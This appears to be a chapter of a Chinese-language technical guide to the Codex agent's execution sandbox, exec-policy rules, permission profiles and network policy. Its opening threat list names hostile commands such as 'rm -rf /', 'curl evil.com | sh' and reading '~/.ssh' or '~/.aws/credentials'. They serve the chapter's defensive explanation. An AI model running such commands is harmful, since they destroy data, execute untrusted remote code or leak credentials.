# 第 7 章：执行沙箱与权限

> 本章导读：第 14 章讲的是"动作走到需要审批这一步之后"的链路。本章回答它上一层的问题--一个 shell 命令、一次文件写入、一个出站网络请求，在到达审批之前，是如何被沙箱边界和 exec-policy 规则过滤的？读完后你会理解 Codex 的三层执行防线（exec-policy 规则判定 → 平台沙箱隔离 → 网络策略回问）、新老两套权限模型（`SandboxPolicy` 与 `PermissionProfile`）的关系、以及三平台沙箱后端（macOS Seatbelt / Linux Landlock+Bubblewrap / Windows Restricted Token）如何统一在一个 `SandboxManager` 之下。
>
> 建议先读 [第 14 章：安全审批与 Guardian](./14-security-approval-and-guardian.md) 了解审批链路全貌，以及 [第 6 章：工具系统与扩展点](./06-tools-and-extensions.md) 了解工具如何进入执行层。

## 7.1 这一章要解决的问题

一个编码 Agent 执行 shell 命令时，风险来自三个方向：

1. **命令本身**：`rm -rf /`、`curl evil.com | sh`、读 `~/.ssh`。这是"做什么"的问题。
2. **文件系统足迹**：即使命令无害，它可能写到工作区之外的敏感路径（`~/.gitconfig`、`.git/hooks`）。这是"碰哪里"的问题。
3. **网络足迹**：命令可能把数据外发到任意主机。这是"去哪里"的问题。

朴素方案是给每个命令做静态黑白名单。但这有三个工程问题：

- **写不全**：命令空间无限，shell 又能 alias、能管道、能嵌套，静态分析永远追不全。
- **判不了语境**：`git push --force` 推自己的分支和推 protected 分支，命令一样，风险不同。
- **拦不住副作用**：一条"安全"的 `cat` 如果能读 `~/.aws/credentials`，它就不安全；一条"安全"的 `curl` 如果能发到外部，它也不安全。命令语义安全 ≠ 副作用安全。

Codex 的做法是**纵深防御**：不指望一层拦住所有威胁，而是让命令判定、文件系统隔离、网络拦截各自独立工作，任何一层拒绝动作就不执行。具体是三层：

```
        模型要执行命令
              │
              ▼
   ┌────────────────────┐
   │ ① exec-policy 规则  │  按"程序+前缀"匹配规则 -> Allow/Prompt/Forbidden
   │    (语义层判定)      │  Allow 且全段命中 -> 可跳过沙箱
   └────────────────────┘
              │ 需要执行
              ▼
   ┌────────────────────┐
   │ ② 平台沙箱          │  Seatbelt/Landlock+Bubblewrap/Restricted Token
   │    (文件系统隔离)    │  限制可写/可读路径，越界即拒绝
   └────────────────────┘
              │ 进程运行中要联网
              ▼
   ┌────────────────────┐
   │ ③ 网络策略          │  每个出站请求回问 controller -> Allow/Deny/Ask
   │    (网络拦截)       │
   └────────────────────┘
```

三层各自独立、各自 fail-closed。第 14 章的审批，就是从 ① 的 `Prompt` 和 ② 的越界拦截里被触发的。

## 7.2 三层防线的全景

下面是从模型发出一条 shell 命令到实际执行的完整路径，标出三层防线各自的位置：

```
模型返回 shell tool call
        │
        ▼
shell 工具 runtime 拿到命令
        │
        ▼
① exec-policy 判定 (core/src/exec_policy.rs)
   Policy::evaluate(command) -> Decision { Allow | Prompt | Forbidden }
        │
        ├── Forbidden ───────────────────> 直接拒绝，回喂模型
        │
        ├── Prompt ──> 结合 AskForApproval:
        │              Never/Granular-closed -> Forbidden
        │              否则 -> NeedsApproval ──> 第14章审批链 ──> 放行/拒绝
        │
        └── Allow (且全段命中) ──> 可 bypass 沙箱
        │
        ▼ (需要执行)
SandboxManager 把 PermissionProfile 转成平台沙箱命令
        │
        ▼
② 平台沙箱 spawn (sandboxing crate)
   macOS: seatbelt (.sbpl 策略)
   Linux: landlock + bubblewrap
   Windows: Restricted Token
        │
        ├── 文件越界写 ──> 沙箱拒绝 (EPERM/沙箱 violation 事件)
        │
        ▼ 进程运行
③ 网络出站请求 (exec-server/src/network_policy_decisions.rs)
   每个请求 RPC 回问 controller -> NetworkDecision { Allow | Deny | Ask }
        │
        ├── Deny/Ask ──> 拦截；Ask 触发网络审批
        │
        ▼
   请求放行，数据出去
```

三层的产物殊途同归：要么放行执行，要么拒绝并回喂模型一个"为什么被拒"的理由。模型看到理由后可以换一种做法。

## 7.3 ① exec-policy：命令的语义层判定

### 7.3.1 三态决策

exec-policy 是一个独立的 crate（`codex-rs/execpolicy`），它对一条命令给出三种决策之一（`execpolicy/src/decision.rs`）：

| Decision | 含义 |
|----------|------|
| `Allow` | 命令可直接运行，无需审批 |
| `Prompt` | 需要审批；若 `approval_policy="never"` 则直接被拒 |
| `Forbidden` | 命令被禁，不给审批机会 |

注意 `Prompt` 是"需要审批"而非"禁止"--它会被送到第 14 章的审批链。但 `Prompt` 和 `Forbidden` 的区别很重要：`Prompt` 给了用户/Guardian 一次放行的机会，`Forbidden` 没有。

### 7.3.2 规则模型：程序前缀 + 网络

exec-policy 的核心数据结构是 `Policy`（`execpolicy/src/policy.rs:28`）：

```rust
pub struct Policy {
    rules_by_program: MultiMap<String, RuleRef>,   // 按程序名分组的命令规则
    network_rules: Vec<NetworkRule>,                // 网络规则
    host_executables_by_name: HashMap<String, Arc<[AbsolutePathBuf]>>,
}
```

命令规则是**前缀匹配**（`rule.rs:40`）：第一条 token 固定（用作索引 key），后续 token 是 `PatternToken`（精确串或备选集合）。例如规则 `["git", ["push", "pull"], "--force"]` 能匹配 `git push --force` 和 `git pull --force`。

```rust
pub struct PrefixPattern {
    pub first: Arc<str>,            // 固定首 token，用作索引
    pub rest: Arc<[PatternToken]>,  // 后续 token，支持 Alts
}
```

匹配后产出 `RuleMatch`，分两种来源（`rule.rs:64`）：

- `PrefixRuleMatch` -- 命中显式规则；
- `HeuristicsRuleMatch` -- 命中启发式回退（当 `Policy` 没有显式规则时的兜底判断）。

### 7.3.3 规则叠加与 amendment

`Policy` 支持 `merge_overlay`（`policy.rs:141`）把两层规则合并--这让"基础规则 + 用户/项目覆盖"成为可能。规则可以从两个方向追加：

- `add_prefix_rule` -- 加命令前缀规则；
- `add_network_rule` -- 加网络规则（host + protocol + decision）。

第 14 章提到的 `ApprovedExecpolicyAmendment`，落点就在这里：用户审批一条命令时，可以顺手把"允许这个前缀"沉淀成一条 `Allow` 规则，下次同类命令直接 `Allow` 免审。`execpolicy/src/amend.rs` 的 `blocking_append_allow_prefix_rule` / `blocking_append_network_rule` 负责把 amendment 写回 Policy。

### 7.3.4 从 Decision 到执行：审批衔接

`core/src/exec_policy.rs:371` 是 exec-policy 判定结果转成执行要求的分水岭：

```rust
match evaluation.decision {
    Decision::Forbidden => ExecApprovalRequirement::Forbidden { reason },
    Decision::Prompt => {
        // 结合 AskForApproval：Never/Granular 关闭 -> Forbidden，否则 NeedsApproval
        match prompt_is_rejected_by_policy(approval_policy, prompt_is_rule) {
            Some(reason) => ExecApprovalRequirement::Forbidden { reason },
            None => ExecApprovalRequirement::NeedsApproval {
                reason,
                proposed_execpolicy_amendment: ...,   // 可顺便提议规则沉淀
            },
        }
    }
    Decision::Allow => ExecApprovalRequirement::Skip {
        bypass_sandbox: 命令所有段都被显式 Allow 规则命中,
    },
}
```

这里有三个细节值得注意：

1. **`Prompt` 不等于一定审批**：如果 `AskForApproval = Never`，或 `Granular` 关了对应通道（`rules` / `sandbox_approval`），`Prompt` 会被降级成 `Forbidden`（`exec_policy.rs:217` 的 `prompt_is_rejected_by_policy`）。这就是 14.3.3 里"`Never` 策略根本不审批"的落点。
2. **`Allow` 可跳沙箱**：只有当命令的**每一段**都被显式 `Allow` 规则命中时才 `bypass_sandbox`。这是性能优化--已知安全的命令不必再套沙箱。但"未命中 Allow 规则"不等于拒绝，只是"不能跳沙箱，要进沙箱跑"。
3. **amendment 可被自动提议**：`try_derive_execpolicy_amendment_for_prompt_rules` 会在审批时尝试推导一条规则，让用户审批一次就免审一类。

> `execve` 路径（unix 系统调用级执行）有独立的 Prompt 处理，在 `core/src/tools/runtimes/shell/unix_escalation.rs:534`，逻辑同构。

## 7.4 权限模型：从 `SandboxPolicy` 到 `PermissionProfile`

Codex 现在有**两套并存的权限模型**，理解它们的关系是读懂执行层的关键。

### 7.4.1 老 `SandboxPolicy`：粗粒度四档

`codex-rs/protocol/src/protocol.rs:1004` 定义了老的沙箱策略枚举：

| 变体 | 文件系统 | 网络 |
|------|---------|------|
| `DangerFullAccess` | 无限制 | 无限制 |
| `ReadOnly` | 只读 | 默认禁，可开 |
| `WorkspaceWrite` | 只读 + 工作区可写（可加 `writable_roots`） | 默认禁，可开 |
| `ExternalSandbox` | 全盘可写（沙箱由外部提供） | 由外部决定 |

这是一个"命名档位"模型--选一个档位，就定了一组粗粒度权限。问题在于它表达不了细粒度 ACL：比如"工作区可写，但 `.git/hooks` 只读"这种需求，老模型很难精确表达。

### 7.4.2 新 `PermissionProfile`：ACL 风格

`codex-rs/protocol/src/models.rs:319` 是新模型：

```rust
pub enum PermissionProfile {
    Managed { file_system: ManagedFileSystemPermissions, network: NetworkSandboxPolicy },
    Disabled,                              // 不套沙箱
    External { network: NetworkSandboxPolicy }, // 沙箱由外部提供
}
```

`Managed` 是主路径，它把权限拆成两个正交维度：

- **文件系统** `ManagedFileSystemPermissions`：ACL entries 风格，每条 entry 指定一个路径 + 访问模式。访问模式有三种（`permissions.rs` 附近）：`deny` > `write` > `read`（同优先级时 deny 胜出，write 胜 read）。这让"工作区可写，但 `.git/hooks` 和 `.codex` 只读"这种保护成为可能。
- **网络** `NetworkSandboxPolicy`：只有两档，`Restricted`（默认，禁网）或 `Enabled`（开网）。

> 文件系统的"受保护元数据"机制（`permissions.rs:42` 的 `forbidden_agent_metadata_write`）专门防提权：在 `Restricted` 模式下，`.codex`、`.git`、`.git/hooks` 这类"改了就能提权"的路径默认只读，除非策略显式给写权限。`WritableRoot` 结构（`protocol.rs:1059`）把"可写根 + 只读子路径 + 受保护元数据名"打包，正是为了让 agent 无法通过改 hooks 来给自己开后门。

### 7.4.3 两套模型的桥接

新老模型不是二选一，而是**新模型是事实来源，老模型做兼容**。`sandboxing/src/policy_transforms.rs` 的 `effective_permission_profile` 负责把各种输入（老 `SandboxPolicy`、命名 profile、用户 toml）归一成 `PermissionProfile`；`execpolicy/src/sandbox_migration.rs` 的 `prefix_rule_migration` 处理规则侧的迁移。

`ActivePermissionProfile`（`models.rs:342`）是个 sidecar，记录"这个 `PermissionProfile` 是从哪个命名 profile 来的"（如 `:workspace` 或用户自定义 `[permissions.<id>]`），让 UI 能显示稳定标识，而不必反向推导。

## 7.5 ② 平台沙箱：三后端统一管理

### 7.5.1 `SandboxManager` 与平台后端

`codex-rs/sandboxing` 是独立 crate，按目标 OS 编译期选择后端（`lib.rs:1`）：

| 平台 | 后端 | 文件 |
|------|------|------|
| macOS | Seatbelt | `seatbelt.rs` + `.sbpl` 策略文件 |
| Linux | Landlock + Bubblewrap | `landlock.rs` + `bwrap.rs` |
| Windows | Restricted Token | `windows.rs`（依赖 `codex-windows-sandbox`） |

`SandboxType` 枚举（`manager.rs:34`）统一标识：

```rust
pub enum SandboxType {
    None,
    MacosSeatbelt,
    LinuxSeccomp,            // 实际是 bwrap + landlock 组合
    WindowsRestrictedToken,
}
```

`get_platform_sandbox`（`manager.rs:60`）在编译期按 `cfg!(target_os)` 返回当前平台的沙箱类型。Windows 沙箱还需 `windows_sandbox_enabled` 运行时开关。

`SandboxManager` 是统一入口，它的职责是把 `PermissionProfile` 翻译成平台特定的 spawn 参数--给 seatbelt 喂 `.sbpl` 策略，给 bwrap 喂 `--bind`/`--ro-bind` 参数，给 landlock 喂 access rule，给 Windows 喂 restricted token 配置。`SandboxablePreference`（`manager.rs:53`）的 `Auto/Require/Forbid` 控制是否强制使用沙箱。

### 7.5.2 Seatbelt 策略文件（macOS）

macOS 用 Apple 的 sandbox-exec（Seatbelt），策略是 `.sbpl` 文本：

- `seatbelt_base_policy.sbpl` -- 基础策略（文件系统/进程限制）
- `seatbelt_network_policy.sbpl` -- 网络策略

`PermissionProfile` 的文件系统 ACL 在运行时被翻译成 seatbelt 的 `allow file-write*` / `deny file-write*` 规则注入。Seatbelt 是内核态强制访问控制，进程一旦套上就无法逃脱，比用户态拦截可靠。

### 7.5.3 Landlock + Bubblewrap（Linux）

Linux 用两个机制组合：

- **Bubblewrap**（`bwrap.rs`）：建命名空间隔离，控制挂载视图（哪些路径可见、可写）。`create_linux_sandbox_command_args_for_permission_profile` 把 profile 转成 bwrap 的 `--bind`/`--ro-bind`/`--dev` 参数。
- **Landlock**（`landlock.rs`）：内核态文件访问控制，作为 bwrap 之上的细粒度补充。`allow_network_for_proxy` 单独放行代理所需的网络路径。

最近提交 `912524d Mount a minimal /dev in full-filesystem Bubblewrap sandboxes` 显示，全文件系统沙箱现在会挂载最小 `/dev`，避免给进程过大的设备面。bwrap 在 WSL1 上有已知问题（`is_wsl1` / `WSL1_BWRAP_WARNING`），会降级处理。

### 7.5.4 Windows Restricted Token

Windows 用受限令牌（`windows.rs`），依赖 `codex-windows-sandbox` crate。它有两条路线（`windows_sandbox_uses_elevated_backend`）：elevated 和 restricted token，由 `resolve_windows_elevated_filesystem_overrides` / `resolve_windows_restricted_token_filesystem_overrides` 解析文件系统覆盖。`WindowsSandboxLevel` 配置控制启用等级。

### 7.5.5 沙箱违规的捕获

沙箱拒绝不是黑盒。`violation.rs` 定义了违规事件类型：

- `FileSystemSandboxViolation` -- 文件越界（带 reason）
- `NetworkSandboxViolation` -- 网络越界

`record_filesystem_sandbox_violation` / `record_network_sandbox_violation` 把违规上报为事件，`is_likely_sandbox_denied`（`denial.rs`）从进程输出/退出码推断"是不是沙箱挡的"。这让系统能区分"命令本身失败"和"沙箱拦截"，前者回喂模型"命令报错"，后者回喂"你的动作越界了，换种做法"。

## 7.6 ③ 网络策略：每个出站请求回问

文件系统靠沙箱一次性隔离，网络没法这么做--进程联网是运行时行为，沙箱只能"全开/全关"，但 agent 任务往往需要"允许访问 github.com，禁止访问内网"。Codex 的做法是**进程内拦截 + 回问 controller**。

### 7.6.1 三态网络决策

`exec-server/src/network_policy_decisions.rs:24` 构造一个 `NetworkPolicyDecider` 闭包，每个出站请求都过它：

```rust
let decider = move |request: NetworkPolicyRequest| async move {
    // 1. host 合法性校验（非空、长度、无控制字符/空白）
    if host 非法 { return NetworkDecision::deny("not_allowed"); }
    // 2. RPC 回问 controller
    tokio::select! {
        _ = process_shutdown.cancelled() => NetworkDecision::deny("not_allowed"),
        response = requests.call_with_timeout(...) => match response.decision {
            Allow => NetworkDecision::Allow,
            Deny { reason } => NetworkDecision::deny(reason),
            Ask { reason } => NetworkDecision::ask(reason),   // 触发网络审批
        }
    }
};
```

网络决策是三态（`ExecServerNetworkPolicyDecision`）：`Allow` / `Deny` / `Ask`。`Ask` 会触发网络审批--这正是 `GuardianApprovalRequest::NetworkAccess` 的来源（见 14.4）。

### 7.6.2 为什么回问而不是沙箱静态放行

从代码结构推断有三个原因：

1. **动态性**：网络目标在运行时才确定（命令里的变量、DNS 解析结果），静态沙箱规则追不上。
2. **可审批**：回问让 controller 能把"未知 host"升级成审批，而不是粗暴 allow/deny。Guardian 可以看对话语境判断"这次 `curl` 是不是任务所需"。
3. **可代理**：controller 可以走 managed network proxy（第 14.5.3 提到 Guardian 也继承这套 allowlist），让受信目的地自动放行、不受信的回问。

注意 decider 里有大量 fail-closed：host 非法、RPC 通道断、超时、进程关闭--一律 `deny("not_allowed")`。和 Guardian 一样，网络策略的安全默认也是"拒绝"。

## 7.7 执行架构：exec-server 与 unified_exec

### 7.7.1 两种执行模式

`core/src/unified_exec/process.rs:88` 是统一执行入口，包装两种模式：

```rust
pub(crate) enum ProcessHandle {
    Direct(...),          // 直接 spawn PTY session
    ExecServer(Arc<dyn ExecProcess>),  // 经 exec-server 执行
}
```

`UnifiedExecProcess` 把两者统一在一个接口下：输出走 `broadcast::Sender<Vec<u8>>`，状态走 `watch::Sender<ProcessState>`，生命周期由 `SpawnLifecycleHandle` 管。上层不关心是直连还是 exec-server。

### 7.7.2 exec-server 的角色

exec-server（`codex-rs/exec-server`）是个**独立的执行服务器进程**，承担实际的进程 spawn、文件系统操作、网络代理。把它拆成独立进程有几个好处：

- **隔离**：沙箱套在 exec-server 启动的子进程上，core 进程本身不在沙箱里，仍能自由访问配置、调度模型。
- **远程化**：exec-server 可以跑在远程机器或容器里（`remote.rs` / `remote_file_system.rs`），让 agent 在远端环境执行而不污染本地。
- **协议化**：core 和 exec-server 之间走 RPC（`rpc.rs` / `rpc_server_requests.rs`），网络策略回问就是一条 RPC。

exec-server 内部按职责拆模块：`process_sandbox.rs`（进程沙箱）、`fs_sandbox.rs` + `sandboxed_file_system.rs`（文件系统沙箱）、`network_policy_decisions.rs`（网络决策）、`environment_*.rs`（环境管理）、`client*.rs`（core 侧客户端）。这是个 40+ 文件的大模块，但职责清晰：core 侧 client 发请求，server 侧在沙箱里执行并回问策略。

## 7.8 设计取舍

| 取舍 | Codex 的选择 | 替代方案 | 为什么这么选 |
|------|------------|---------|------------|
| 防御层数 | 三层纵深（exec-policy + 沙箱 + 网络） | 单层强沙箱 | 任何一层都能独立拦威胁；单层一旦绕过就全失守 |
| 命令判定 | 程序前缀规则 + 启发式回退 | 全静态分析 / 全 LLM 判定 | 静态分析追不全 shell 嵌套；LLM 慢且不稳；前缀规则快、可审计、可沉淀 |
| Prompt 的降级 | Never/Granular 关闭时变 Forbidden | 一律 Prompt | Never 语义就是"不问人"，再 Prompt 自相矛盾 |
| Allow 跳沙箱 | 仅全段命中才 bypass | 任意命中 bypass | 防止"一段安全"误判整条安全；bypass 是优化不是权利 |
| 权限模型 | 新老并存，新做事实来源 | 一次性迁移 | 兼容旧配置；ACL 表达力远超命名档位，但迁移成本高 |
| 文件 ACL | deny>write>read 优先级 | 纯白名单 | 需要表达"可写但子路径只读"保护 .git/hooks 这类提权点 |
| 网络 | 进程内拦截 + 回问 | 沙箱静态 allow/deny | 网络目标是运行时动态值；回问才能升级成审批/走代理 |
| 沙箱后端 | 平台原生（Seatbelt/Landlock/bwrap/RestrictedToken） | 自研用户态沙箱 | 内核态强制访问控制不可逃脱；自研沙箱不可靠且维护成本高 |
| exec-server | 独立进程 | core 内执行 | 隔离 core 免受沙箱约束；支持远程执行 |

## 7.9 关键实现入口

| 关注点 | 文件 |
|--------|------|
| exec-policy 三态决策 | `codex-rs/execpolicy/src/decision.rs` |
| exec-policy 规则模型 `Policy` / `PrefixPattern` | `codex-rs/execpolicy/src/policy.rs`、`codex-rs/execpolicy/src/rule.rs` |
| 规则追加 / amendment | `codex-rs/execpolicy/src/amend.rs` |
| core 侧 exec-policy 判定 + 审批衔接 | `codex-rs/core/src/exec_policy.rs` |
| execve 路径 Prompt 处理 | `codex-rs/core/src/tools/runtimes/shell/unix_escalation.rs` |
| 老 `SandboxPolicy` 枚举 | `codex-rs/protocol/src/protocol.rs` |
| 新 `PermissionProfile` 枚举 | `codex-rs/protocol/src/models.rs` |
| 文件系统 ACL + 受保护元数据 | `codex-rs/protocol/src/permissions.rs` |
| 网络 `NetworkSandboxPolicy` | `codex-rs/protocol/src/permissions.rs` |
| 新老模型桥接 | `codex-rs/sandboxing/src/policy_transforms.rs`、`codex-rs/execpolicy/src/sandbox_migration.rs` |
| sandboxing crate 入口 | `codex-rs/sandboxing/src/lib.rs` |
| `SandboxManager` / 平台选择 | `codex-rs/sandboxing/src/manager.rs` |
| macOS Seatbelt 后端 + 策略 | `codex-rs/sandboxing/src/seatbelt.rs`、`seatbelt_base_policy.sbpl`、`seatbelt_network_policy.sbpl` |
| Linux Landlock 后端 | `codex-rs/sandboxing/src/landlock.rs` |
| Linux Bubblewrap 后端 | `codex-rs/sandboxing/src/bwrap.rs` |
| Windows Restricted Token 后端 | `codex-rs/sandboxing/src/windows.rs` |
| 沙箱违规捕获 | `codex-rs/sandboxing/src/violation.rs`、`codex-rs/sandboxing/src/denial.rs` |
| 网络策略回问 | `codex-rs/exec-server/src/network_policy_decisions.rs` |
| 统一执行入口 | `codex-rs/core/src/unified_exec/process.rs` |
| exec-server 进程沙箱 | `codex-rs/exec-server/src/process_sandbox.rs` |
| exec-server 文件系统沙箱 | `codex-rs/exec-server/src/fs_sandbox.rs`、`codex-rs/exec-server/src/sandboxed_file_system.rs` |
| exec-server RPC | `codex-rs/exec-server/src/rpc.rs` |
| 审批缓存 `ApprovalStore` | `codex-rs/core/src/tools/sandboxing.rs` |

## 7.10 小结

Codex 的执行安全是**三层纵深防御**：

- **exec-policy** 在语义层判定"这条命令该不该跑"，按程序前缀规则给出 `Allow`/`Prompt`/`Forbidden`，其中 `Prompt` 衔接第 14 章的审批链，`Allow` 可跳沙箱；
- **平台沙箱** 在执行层隔离"这条命令能碰什么"，用 macOS Seatbelt / Linux Landlock+Bubblewrap / Windows Restricted Token 把文件系统足迹关进 ACL 笼子，越界即拒；
- **网络策略** 在运行时拦截"这条命令能去哪"，每个出站请求回问 controller，三态 `Allow`/`Deny`/`Ask` 让未知 host 升级成审批而非粗暴放行。

权限模型正从老的命名档位 `SandboxPolicy`（四档）迁向新的 ACL 风格 `PermissionProfile`（文件系统 entries + 网络两档），新模型是事实来源，老模型做兼容。文件系统 ACL 用 `deny>write>read` 优先级表达"可写但子路径只读"，专门保护 `.git/hooks` 这类提权点。

三层各自 fail-closed、各自可独立拦威胁，又通过 `Prompt`/`Ask`/越界事件衔接到第 14 章的审批与 Guardian--这就是 Codex 把"自动执行"和"安全可控"调和起来的方式：不靠一层完美防御，靠多层各自保守。

下一章会讲配置与状态管理（待写），看用户配置如何驱动这两章里的 `AskForApproval`、`PermissionProfile`、exec-policy 规则。
